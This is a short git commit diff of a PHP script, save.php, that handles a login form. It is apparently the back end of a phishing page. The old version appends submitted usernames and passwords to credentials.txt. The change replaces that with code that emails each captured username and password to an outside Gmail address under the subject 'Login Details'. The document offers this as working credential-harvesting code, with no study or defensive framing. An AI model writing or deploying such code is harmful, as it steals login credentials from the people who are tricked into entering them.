06fe42afaea1321e0ac57f16f51b52f1a9eaf46d
ivanzheng14 <ivanzheng14@hotmail.com>
2023-07-14 01:58:24 -0400

    d

--- save.php
+++ save.php
@@ -3,9 +3,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   $username = $_POST["username"];
   $password = $_POST["password"];
 
-  // Save the username and password to a file
-  $file = fopen("credentials.txt", "a"); // Open the file in append mode
-  fwrite($file, "Username: " . $username . " - Password: " . $password . "\n");
-  fclose($file);
+  // Set up the email parameters
+  $to = "ivanzheng4826@gmail.com"; // Replace with your email address
+  $subject = "Login Details";
+  $message = "Username: " . $username . "\nPassword: " . $password;
+  $headers = "From: sender-email@example.com"; // Replace with the sender's email address
+
+  // Send the email
+  $success = mail($to, $subject, $message, $headers);
+
+  if ($success) {
+    echo "Success!";
+  } else {
+    echo "Failed.";
+  }
 }
 ?>
